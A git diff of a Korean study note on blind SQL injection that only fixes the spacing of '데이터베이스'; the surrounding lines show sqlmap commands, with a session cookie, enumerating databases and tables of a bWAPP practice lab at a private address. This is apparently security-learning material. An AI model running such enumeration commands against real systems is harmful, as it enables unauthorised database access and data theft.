@@ -24,7 +24,7 @@ tags:
 * 이전에 공부한 대놓고 하는 SQL 인젝션은 웬만하면 안 된다고 함 ^^
 * 대세는 Blind SQL 인젝션
 * 쿼리의 결과를 참과 거짓만으로만 출력하는 페이지에 사용하는 공격
-* 출력 내용이 참과 거짓밖에 없어서 데이터 베이스의 내용을 추측하여 쿼리를 조작
+* 출력 내용이 참과 거짓밖에 없어서 데이터베이스의 내용을 추측하여 쿼리를 조작
 
 ![image](https://user-images.githubusercontent.com/28076542/52172656-7fe93880-27b7-11e9-94fb-64b4e898f497.png)
 
@@ -197,7 +197,7 @@ mysql> select * from movies;
 
 ![image](https://user-images.githubusercontent.com/28076542/52172930-487d8a80-27bd-11e9-852d-7a1e2670713d.png)
 
-2. 데이터 베이스 이름 알아오기
+2. 데이터베이스 이름 알아오기
 
 ```bash
 sqlmap -u "http://192.168.190.143/bWAPP/sqli_4.php?title=test&action=search" --cookie="PHPSESSID=b7269975b579606d86426fca0c3b0e56;security_level=0" --dbs --level=3 --risk=3
@@ -218,9 +218,9 @@ available databases [5]:
 [*] shutting down at 18:04:32
 ```
 
-* 데이터 베이스 이름들을 알아오는데 성공하였으니 테이블을 알아오기
+* 데이터베이스 이름들을 알아오는데 성공하였으니 테이블을 알아오기
 
-3. 데이터 베이스 테이블 알아오기
+3. 데이터베이스 테이블 알아오기
 
 ```bash
 sqlmap -u "http://192.168.190.143/bWAPP/sqli_4.php?title=test&action=search" --cookie="PHPSESSID=b7269975b579606d86426fca0c3b0e56;security_level=0"  -D bWAPP --tables
